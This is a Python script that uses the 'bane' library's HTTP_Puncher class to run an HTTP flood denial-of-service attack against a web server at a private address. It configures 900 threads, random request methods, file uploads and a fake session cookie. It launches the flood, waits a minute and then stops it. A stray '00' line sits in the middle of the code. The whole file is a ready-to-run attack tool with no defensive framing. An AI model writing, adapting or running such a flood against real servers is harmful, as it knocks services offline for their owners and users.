from bane.ddos import HTTP_Puncher

def main():
    try:
        
        # Initialize the HTTP_Puncher instance
        ddos_attack = HTTP_Puncher(
            u="http://192.168.1.147:8080",  # Target URL
            send_files=True,  # Enable sending files in the attack
            cookie="SessionID=12345",  # Custom cookie
            user_agents=["Mozilla/5.0", "CustomUserAgent/1.0"],  # User-Agent headers
            method=3,  # Use random HTTP methods (GET or POST)
            threads_daemon=True,  # Set threads as daemons
            threads=900,  # Number of threads
            timeout=5,  # Timeout for HTTP requests
            duration=30,  # Duration of the attack in seconds
            logs=True,  # Enable logging
            tor=False,  # Do not use Tor for requests
            scrape_target=False,  # Do not scrape additional URLs
            scraped_urls=0  # Number of scraped URLs (irrelevant since scrape_target=False)
        )
        
        print("[*] Starting DDoS attack...")
        ddos_attack.attack()  # Launch the attack

        print("[*] DDoS attack in progress... Monitor logs if enabled.")
        00
        # Let the attack run for the specified duration 
        import time
        time.sleep(60)  # Adjust if testing in shorter intervals
        
        # Stop the attack manually if needed
        print("[*] Stopping DDoS attack...")
        ddos_attack.stop = True  # Graceful termination of the attack

        print("[*] DDoS attack stopped.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")

if __name__ == "__main__":
    main()